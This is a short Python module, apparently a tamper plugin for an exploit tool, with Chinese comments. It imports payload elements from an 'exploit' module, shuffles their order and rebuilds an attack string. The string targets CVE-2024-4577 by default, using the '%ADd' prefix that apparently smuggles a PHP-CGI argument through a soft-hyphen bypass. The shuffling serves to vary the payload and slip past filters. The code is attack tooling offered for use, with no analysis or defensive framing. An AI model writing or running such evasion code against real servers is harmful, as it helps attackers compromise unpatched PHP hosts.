# tamper_payload_shuffle.py

import random
from exploit import PAYLOAD_ELEMENTS, CVE_PREFIXES  # 確保路徑正確引用

name = "tamper_payload_shuffle"
description = "隨機打亂 payload 中的元素順序"

def tamper(data):
    ids = data.get("element_ids")
    if not ids or not isinstance(ids, list):
        return data

    random.shuffle(ids)

    # 根據元素重建 payload
    cve = data.get("cve_id", "CVE-2024-4577")
    prefix = CVE_PREFIXES.get(cve, "%ADd")
    payload = "+".join([f"{prefix}+{PAYLOAD_ELEMENTS[i]}" for i in ids])
    data["payload"] = payload
    return data
